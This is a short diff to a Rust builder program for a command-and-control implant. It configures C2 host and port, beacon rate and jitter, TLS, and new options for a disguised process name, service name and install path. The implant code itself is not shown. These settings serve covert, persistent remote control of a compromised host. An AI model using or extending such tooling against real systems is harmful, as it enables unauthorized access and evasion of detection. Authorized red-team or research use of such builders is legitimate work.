@@ -76,8 +76,8 @@ fn main() {
         std::process::exit(1);
     }
 
-    // Always build the base implant binary
-    let package = "implant-tier1";
+    // Build the implant binary (implant crate has both lib + bin)
+    let package = "implant";
     let port = cli.port.unwrap_or(if protocol == "http" { 80 } else { 443 });
 
     println!("╔══════════════════════════════════════════════════╗");
@@ -136,12 +136,17 @@ fn main() {
     cmd.env("C2_HOST", &cli.host);
     cmd.env("C2_PORT", port.to_string());
     cmd.env("BEACON_RATE", cli.beacon_rate.to_string());
+    cmd.env("BEACON_JITTER", cli.jitter.to_string());
+    cmd.env("C2_TLS", if protocol == "https" { "1" } else { "0" });
+    cmd.env("PROCESS_NAME", &cli.process_name);
+    cmd.env("SERVICE_NAME", &cli.service_name);
+    cmd.env("IMPLANT_PATH", &cli.implant_path);
 
     if cli.labelling_marker {
         cmd.env("LABELLING_MARKER", "1");
     }
 
-    // Handle TLS: if http is requested, disable default features (which enable TLS)
+    // For HTTP, disable default features (which enable TLS in implant lib)
     if protocol == "http" {
         cmd.arg("--no-default-features");
     }
